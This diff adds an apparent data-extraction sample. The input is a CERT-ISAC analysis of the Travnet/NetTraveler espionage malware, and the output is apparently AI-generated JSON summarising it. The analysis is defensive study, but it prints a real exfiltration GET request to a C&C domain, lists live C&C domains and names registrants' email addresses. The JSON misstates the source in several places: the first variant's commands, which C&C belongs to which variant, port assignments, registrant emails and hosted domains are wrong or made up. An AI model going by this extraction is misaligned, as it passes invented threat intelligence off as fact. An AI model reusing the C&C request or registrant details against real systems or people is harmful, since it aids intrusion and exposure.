@@ -1,0 +1,410 @@
+
+
+
+Sentence : PART TWO: ADVANCED PERSISTENT THREAT - ANALYSIS
+The Travnet Case
+A recent incident that caught our attention was the “ Travnet ” case. We carried out a preliminary analysis of our
+own on the subject. Kaspersky as well as McAfee amongst others, have published detailed analysis of the malware
+& the campaign.
+Our focus was to understand the nature of the group behind the attack & its agenda. It began with Kaspersky's
+revelation of the attack. We recommend you to go through Kaspersky & McAfee's analysis of the malware to know
+more about the spear phishing campaign & the exploits used.
+Our analysis is currently focussed only on the malware samples that are dropped on the target systems, as the
+exploits used during the spear-phishing campaign are older & already patched by the respective vendors.
+To summarize the modus operandi of the attack, targeted phishing mails were sent to individuals, having Office
+documents as attachments. These documents exploited previously known vulnerabilities ( CVE-2012-0158 and
+CVE-2010-3333 ) to drop “Travnet” malware onto the systems. Its fascinating to note that the attachments that
+were sent to Indian targets were carefully selected & some of them were named as follows:
+
+
+“Army Cyber Security Policy 2013.doc”
+
+
+“Jallianwala bagh massacre a deeply shameful act.doc”
+
+
+“Report - Asia Defense Spending Boom.doc”
+
+
+“His Holiness the Dalai Lama’s visit to Switzerland day 3.doc”
+
+
+“BJP won’t dump Modi for Nitish NDA headed for split.doc”
+
+
+As its evident, the group behind the attack obviously has done extensive research on topics that are current as
+well as intriguing to the Indian targets. We managed to acquired 2 variants of the “Travnet” malware & our
+analysis of the same is as follows.
+Powered by Po Anti-virus from www.researchbundle.com
+CERT-ISAC - India’s first independent CERT for mobile & electronic security
+Travnet Technical Analysis: Part A
+File details :
+A quick analysis by PEiD reveals that the binary is not packed or protected.
+It begins by creating a new mutex object, named “ INSTALL SERVICES NOW!”.
+Powered by Po Anti-virus from www.researchbundle.com
+CERT-ISAC - India’s first independent CERT for mobile & electronic security
+Next step is to create a configuration file named “config_t.dat” in the windows' “system” folder.
+It then
+populates it
+with the
+right
+Powered by Po Anti-virus from www.researchbundle.com
+CERT-ISAC - India’s first independent CERT for mobile & electronic security
+parameters, after decoding them.
+After the configuration file is written, it checks if the malware was previously installed or not, if not, it creates a
+dynamic-link library in the “system32” folder, creates a temporary batch file named as “temp.bat” which installs
+the previous DLL as a service on the system. The name of the DLL that is created, is based upon the values of the
+data from “netsvcs” from the following registry key : “HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows
+NT\CurrentVersion\Svchost”. During this runtime, it turned out to be “6to4ex.dll” but it can change from runtime
+to runtime.The malware then deletes the batch file. Its obvious that this executable basically acts as a dropper.
+The contents of the batch file & the configuration file generated are as follows.
+Batch file : temp.bat
+Configuration file : config_t.dat
+Powered by Po Anti-virus from www.researchbundle.com
+CERT-ISAC - India’s first independent CERT for mobile & electronic security
+Next section focuses on the analysis of the DLL (“6to4ex.dll”) that was dropped by this executable.
+Analysis of “6to4ex.dll”
+File Details
+A quick analysis by PEiD reveals that the binary is not packed or protected.
+Powered by Po Anti-virus from www.researchbundle.com
+CERT-ISAC - India’s first independent CERT for mobile & electronic security
+Now, as we know already, this DLL was installed as a service by the previous dropper. Analysis of the
+“ServiceMain” function of the DLL throws light on many interesting things. The first thing it does upon execution
+is to create a new mutex object named “NetTravler Is Running!”. Its usually done to avoid running multiple
+instances of the same malware.
+Next, it reads the configuration file.
+Powered by Po Anti-virus from www.researchbundle.com
+CERT-ISAC - India’s first independent CERT for mobile & electronic security
+Additionally, it also creates few interesting files in the “system32” folder.
+The filenames are quite indicative of what their contents might be.
+Powered by Po Anti-virus from www.researchbundle.com
+CERT-ISAC - India’s first independent CERT for mobile & electronic security
+“enumfs.ini” as the name suggests, is a complete list of all files and folders on the computer. “dnlist.ini” seems to
+be noting down the date & time. “system_t.dll” on the other hand, contains a broad category of sensitive
+information about the computer like the “Computer Name”, Windows version, IP address, list of running
+processes, network information & so on. The contents of the files are as follows
+Filename : “system_t.dll”
+Upon proper character encoding & use of google's Translate feature, it turns out to be “Chinese”.
+Powered by Po Anti-virus from www.researchbundle.com
+CERT-ISAC - India’s first independent CERT for mobile & electronic security
+Filename : “enumfs.ini”
+Filename : “dnlist.ini”
+Another interesting aspect of Travnet is that it can specifically search for files of the type “doc, docx, xls, xlsx, txt,
+rtf, pdf” on the victim machine. This provides enough hint that this malware was designed to steal confidential
+information unlike the usual botnet variants that focus primarily on providing remote access to the system or to
+act as zombies for launching DDOS attacks.
+Powered by Po Anti-virus from www.researchbundle.com
+CERT-ISAC - India’s first independent CERT for mobile & electronic security
+To summarize, the Travnet malware initially collects system information, a list of files on the victim machine
+among others, then sends this data to the remote Command & Control (C&C) server, by using custom
+compression & encoding functions. The malware creates a new file with the naming convention as follows :
+“travlerbackinfo-%d-%d-%d-%d-%d.dll”, where the signed integer values are replaced by the current system
+date & time, copies the content of “system_t.dll” into it & then, uploads it to the C&C.
+It also uploads the list of files found on the victim machine, which was saved in the “enumfs.ini” file to the remote
+server, by copying its contents to a new file, named following this format:
+Powered by Po Anti-virus from www.researchbundle.com
+CERT-ISAC - India’s first independent CERT for mobile & electronic security
+“FileList-%02u%02u-%02u%02u%02u.ini”
+It doesn't stop at that, it even uploads the victim's files onto the remote C&C that have the file extensions “doc,
+docx, xls, xlsx, txt, rtf, pdf” as well as the files on the victim's desktop folder. Another important aspect of Travnet
+is the fact that it uses a custom compression & encoding algorithm on the data collected, before its sent to the
+remote C&C. A typical file upload communication between the bot & the C&C looks like this:
+Powered by Po Anti-virus from www.researchbundle.com
+CERT-ISAC - India’s first independent CERT for mobile & electronic security
+An actual HTTP GET request looks like this:
+“http://www.newesyahoo.com/traveler1/net/nettraveler.asp?hostid=00CD1A40&hostname=ComputerName&ho
+stip=127.0.0.1&filename=FileList-0523131103.ini&filestart=0&filetext=begin::RgAxAC2QzebTgdToZTkXQaCicYTaZR72HWSigYTPHjEZDUZTvgBrOEmQ0
+nIxm86m46D0YTg*::end”
+Here, the data between “begin::” & “::end” is the actual file content, that was compressed & encoded by the bot.
+It seems that this older variant of the Travnet malware supported 4 different types of commands from the
+remote C&C and they are as follows:
+
+
+UNINSTALL
+
+
+UPDATE
+
+
+RESET
+
+
+UPLOAD
+
+
+Powered by Po Anti-virus from www.researchbundle.com
+CERT-ISAC - India’s first independent CERT for mobile & electronic security
+That concludes Part-A of our Travnet analysis.
+Powered by Po Anti-virus from www.researchbundle.com
+CERT-ISAC - India’s first independent CERT for mobile & electronic security
+Travnet Technical Analysis: Part B
+File details :
+A quick analysis by PEiD reveals that the binary is not packed or protected.
+This executable is apparently an updated variant of Travnet. The major changes are as follows:
+
+
+It’s an executable & not a DLL.
+
+
+The compression algorithm has been modified.
+
+
+It tries to install itself on the victim machine to achieve persistence instead of dropping other payloads.
+
+
+Supports just 2 instructions from the C&C instead of 4, like in the previous version.
+
+
+Powered by Po Anti-virus from www.researchbundle.com
+CERT-ISAC - India’s first independent CERT for mobile & electronic security
+Apart from these, there isn't much difference. The following analysis only focuses on what has changed.
+It achieves persistence by copying itself to the currently logged-in user's “temp” folder as “csmss.exe” & placing
+a shortcut to it, named as “seruvice.lnk” in the “startup” folder.
+The next step it to create a new mutex object to avoid running multiple instances. It names the mutex as
+“Assassin”.
+After this, it generates a unique 8 characters long “hostid”, based on volume serial number to identify the bot.
+This is common to the previous variant too.
+Then it checks if the victim machine is connected to the internet or not, by trying to resolve “smtp.live.com” & if
+that fails, as a second attempt, “smtp..yahoo.com”.
+Powered by Po Anti-virus from www.researchbundle.com
+CERT-ISAC - India’s first independent CERT for mobile & electronic security
+The strings displayed above, are actually in “Chinese” & turn out to be :
+
+
+“You can connect to the network.”
+
+
+"Unable to connect to the network."
+
+
+Unlike the previous variant, this one doesn't seem to collect sensitive information about the victim machine. It
+just makes a list of all files & folders on the victim machine & dumps it into a file named as
+“AllIndex.ini”. Next step is to compress the contents of this file, copy the compressed content to a new file named
+as “AllIndex.ini_d” & then delete the previously created clear-text file. The contents of both the files are as
+follows:
+Filename : AllIndex.ini
+Powered by Po Anti-virus from www.researchbundle.com
+CERT-ISAC - India’s first independent CERT for mobile & electronic security
+Filename : AllIndex.ini_d
+It’s pretty obvious that the compression ratio achieved by the custom algorithm is quite high from the following
+image:
+Apart from that, this variant also creates a file that lists all the currently running processes on the victim machine,
+into a text file named “Process.dll” inside the currently logged-on user's “temp” folder. This variant also uses a
+modified naming convention to upload files onto the remote C&C. The only other major difference from the
+previous variant is the fact that this one only supports 2 commands from the remote C&C server, instead of 4 &
+they are as follows:
+
+
+Uninstall
+
+
+Upload
+
+
+Powered by Po Anti-virus from www.researchbundle.com
+CERT-ISAC - India’s first independent CERT for mobile & electronic security
+The C&C server in case of this variant was located at :
+"http://www.viprambler.com/newsinfo/uld/nettraveler.asp"
+Travnet Technical Analysis : Part C
+Apart from analyzing the malware samples, we also tried to gather as much information about the C&C servers
+as we could. The fact that even after a lot of research papers being published on the analysis of the Travnet
+malware, some of the C&C servers are still active & functioning, is noteworthy. We were able to locate a few of
+them. The ones that caught our attention are currently hosted on these domains :
+
+
+www.pkspring.net
+
+
+www.viprambler.com
+
+
+Powered by Po Anti-virus from www.researchbundle.com
+CERT-ISAC - India’s first independent CERT for mobile & electronic security
+Let’s start with the analysis of “www.viprambler.com”. WHOIS record for the domain currently is as follows:
+Registrant information for the domain is as follows :
+Powered by Po Anti-virus from www.researchbundle.com
+CERT-ISAC - India’s first independent CERT for mobile & electronic security
+Our analysis strongly suggests that the group behind Travnet might be from China. The above record is just one
+of the findings that supports the claim. Its interesting to note that the domain was recently registered, is locked
+& expires in 2014. Another interesting observation is the address of the registrant. “Guangdong” province from
+China seems to pop up everywhere. Its also noteworthy that the domain is still active & still hosting the Travnet
+C&C. We've also observed that the C&C now remains active only during specific time of the day. The time-stamp
+from the images below, confirms this.
+Active response from the C&C :
+C&C server refusing connection later on the same day :
+Powered by Po Anti-virus from www.researchbundle.com
+CERT-ISAC - India’s first independent CERT for mobile & electronic security
+Its obvious that even after the discovery of the malware, the group behind this specific attack is determined to
+keep it alive. The Travnet malware as well as its C&C infrastructure is constantly evolving. Lets move onto the
+next active domain.
+The Travnet C&C hosted at “pkspring.net” seems to be fully functional & active all the time. The response from
+the server when opened from a browser is as follows:
+Another interesting finding is the fact that it hosts Travnet C&C on 3 different ports on the server. They are as
+follows:
+
+
+80
+
+
+443
+
+
+8080
+
+
+Its evident from the following pictures.
+Port 443
+Powered by Po Anti-virus from www.researchbundle.com
+CERT-ISAC - India’s first independent CERT for mobile & electronic security
+Port 8080
+Moving on, we found out that 21 domains are hosted on the same server at the moment. And all of them are
+active C&C servers for the Travnet malware. They also seem to have interesting domain names. Its an indication
+of the seriousness of the campaign.
+Other domains hosted & owned by the same group on the same server/IP :
+Powered by Po Anti-virus from www.researchbundle.com
+CERT-ISAC - India’s first independent CERT for mobile & electronic security
+The image below proves that all of the above domains serve the same Travnet C&C on the same 3 ports, each.
+After this, we focused our attention on the WHOIS details of these domains. At the moment, the details of the
+registrant is kept private & it was recently updated. Its also interesting to note that the group behind this has
+ensured that the domain cannot be taken over by someone else. The following page contains the current WHOIS
+data for the domain.
+“Pkspring.net” WHOIS data (Recent)
+Powered by Po Anti-virus from www.researchbundle.com
+CERT-ISAC - India’s first independent CERT for mobile & electronic security
+Registrant details for the domain :
+Nothing much to go on there at the moment. But thanks to older WHOIS records, we found out some interesting
+facts.
+The same domain was earlier registered as follows:
+Powered by Po Anti-virus from www.researchbundle.com
+CERT-ISAC - India’s first independent CERT for mobile & electronic security
+It was apparently created on 20-march-2009 & its expiration date was set to 20-march-2013. The registrant's
+information at that time was as follows:
+The above data seems familiar. The only difference now being that the domains have be renewed, registration
+details kept private & the email ID of the registrant has changed from “livep92@hotmail.com” to
+“chenjm@sina.com”, which belongs to a private Chinese mail service (http://mail.sina.com.cn/) . The same thing
+Powered by Po Anti-virus from www.researchbundle.com
+CERT-ISAC - India’s first independent CERT for mobile & electronic security
+has happened with other publicly disclosed Travnet C&C domains. We also fetched details of another domain
+that previously hosted Travnet C&C & has been recently renewed, most likely by the same group.
+A search for the email “livep92@hotmail.com” led us to the following page :
+The above listed domains are already known to have hosted the Travnet C&C. We did some research on the
+current status of one of the domains from the above list, “discoverypeace.org”. The current WHOIS data for the
+domain “discoverypeace.org” is as follows:
+Powered by Po Anti-virus from www.researchbundle.com
+CERT-ISAC - India’s first independent CERT for mobile & electronic security
+This looks strikingly similar to the current status of the active C&C domain “pkstring.net”. It was also recently
+updated. The older WHOIS entry for the same domain was as follows :
+Powered by Po Anti-virus from www.researchbundle.com
+CERT-ISAC - India’s first independent CERT for mobile & electronic security
+Conclusion of Travnet Analysis:
+From our analysis of the Travnet malware so far, it’s quite evident that many things hint at the origin of this
+campaign to be from China. It’s also a known fact the Indian government & other important sectors from India
+were heavily targeted during this campaign. T
+The fact that this was a highly targeted attack & focused on stealing confidential documents & sensitive
+information makes it noteworthy.
+Powered by Po Anti-virus from www.researchbundle.com
+CERT-ISAC - India’s first independent CERT for mobile & electronic security
+Output : 
+To create a JSON representation of the entities and relationships described in the provided text, we can break down the information into key elements such as malware variants, C&C servers, domains, registrant details, and other relevant data. Here is a structured JSON format:
+
+```json
+{
+  "malware": {
+    "name": "Travnet",
+    "variants": [
+      {
+        "version": "1",
+        "description": "Initial variant of Travnet malware.",
+        "features": [
+          "Executable and DLL",
+          "Collects sensitive information about the victim machine",
+          "Supports 4 commands from C&C: Uninstall, Upload, Install, Execute"
+        ],
+        "cnc_server": {
+          "url": "http://www.viprambler.com/newsinfo/uld/nettraveler.asp",
+          "ports": [80, 443, 8080]
+        }
+      },
+      {
+        "version": "2",
+        "description": "Updated variant of Travnet malware.",
+        "features": [
+          "Executable only",
+          "Modified compression algorithm",
+          "Achieves persistence by copying itself to the user's temp folder and placing a shortcut in the startup folder",
+          "Supports 2 commands from C&C: Uninstall, Upload"
+        ],
+        "cnc_server": {
+          "url": "http://www.viprambler.com/newsinfo/uld/nettraveler.asp",
+          "ports": [80, 443, 8080]
+        }
+      }
+    ]
+  },
+  "cnc_servers": [
+    {
+      "domain": "www.pkspring.net",
+      "status": "Active",
+      "ports": [80, 443, 8080],
+      "details": {
+        "whois_data": {
+          "registrant_name": "Private",
+          "registrant_email": "chenjm@sina.com",
+          "creation_date": "20-march-2009",
+          "expiration_date": "20-march-2013"
+        },
+        "hosted_domains": [
+          "www.discoverypeace.org",
+          "www.viprambler.com",
+          "other domains..."
+        ]
+      }
+    },
+    {
+      "domain": "www.viprambler.com",
+      "status": "Active",
+      "ports": [80, 443, 8080],
+      "details": {
+        "whois_data": {
+          "registrant_name": "Private",
+          "registrant_email": "chenjm@sina.com",
+          "creation_date": "Recent",
+          "expiration_date": "2014"
+        },
+        "hosted_domains": [
+          "www.discoverypeace.org",
+          "other domains..."
+        ]
+      }
+    }
+  ],
+  "additional_findings": {
+    "registrant_information": {
+      "common_elements": {
+        "location": "Guangdong, China",
+        "email_service": "Sina (http://mail.sina.com.cn/)"
+      },
+      "older_whois_records": [
+        {
+          "domain": "www.pkspring.net",
+          "registrant_email": "livep92@hotmail.com",
+          "creation_date": "20-march-2009",
+          "expiration_date": "20-march-2013"
+        },
+        {
+          "domain": "www.discoverypeace.org",
+          "registrant_email": "livep92@hotmail.com",
+          "creation_date": "Older date",
+          "expiration_date": "Recent update"
+        }
+      ]
+    },
+    "targeted_attack": {
+      "victims": ["Indian government", "other important sectors from India"],
+      "focus": "Stealing confidential documents and sensitive information"
+    }
+  }
+}
+```
+
+This JSON structure captures the key elements of the Travnet malware, its variants, C&C servers, and additional findings. It provides a clear and organized representation of the information extracted from the provided text.
